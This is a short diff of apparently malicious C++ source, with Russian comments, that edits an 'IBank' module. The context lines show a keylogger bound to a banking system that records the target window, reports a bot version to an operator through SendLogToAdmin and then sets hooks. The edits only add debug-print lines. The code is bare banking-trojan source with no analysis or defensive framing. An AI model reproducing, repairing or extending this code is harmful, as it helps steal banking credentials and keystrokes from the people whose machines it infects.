@@ -256,15 +256,17 @@ namespace IBank
 	void SystemActivated(LPVOID Sender)
 	{
 		System = (PKeyLogSystem)Sender;
-
+pOutputDebugStringA("00");
 		// Активированы система IBank
 		IBDBG("IBank", "Система %s активирована, %08x", System->Name, (DWORD)GetImageBase() );
 
 		// Инициализируем данные системы
 		PKeyLogger Logger = KeyLogger::GetKeyLogger();
+pOutputDebugStringA("01");
 
 		Log.PID     = Logger->PID;
 		Log.LogFile = STR::New(Logger->FileName);
+pOutputDebugStringA("03");
 
 		// Определяем основное окно
 		Log.Wnd = Logger->ActiveWND;
@@ -275,7 +277,6 @@ namespace IBank
 			if (Temp != NULL)
             	Log.Wnd = Temp;
         }
-
 		//отсылаем версию бота (для патча)
 		SendLogToAdmin( "botver", versionPatch );
 		//  Ставим хуки
